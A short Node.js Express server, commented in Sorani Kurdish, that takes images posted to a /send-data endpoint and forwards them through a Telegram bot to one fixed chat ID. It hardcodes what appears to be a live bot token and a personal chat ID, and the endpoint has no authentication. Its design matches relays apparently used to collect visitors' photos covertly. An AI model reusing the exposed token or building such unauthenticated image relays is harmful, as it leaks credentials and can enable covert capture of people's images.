const express = require("express");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
app.use(bodyParser.json());

// 👇 توکنەکەت لێرە دابنێ
const token = "8636016241:AAFl0oZchOwCboqgNUiBGClmPwTvM8wu3fs";
const bot = new TelegramBot(token);

// 👇 route بۆ وەرگرتنی داتا
app.post("/send-data", (req, res) => {
    const { image } = req.body;

    // 👇 ناردنی وێنە بۆ تۆ لە Telegram
    bot.sendPhoto("835953690", image);

    res.send("OK");
});

app.listen(3000, () => {
    console.log("Server running...");
});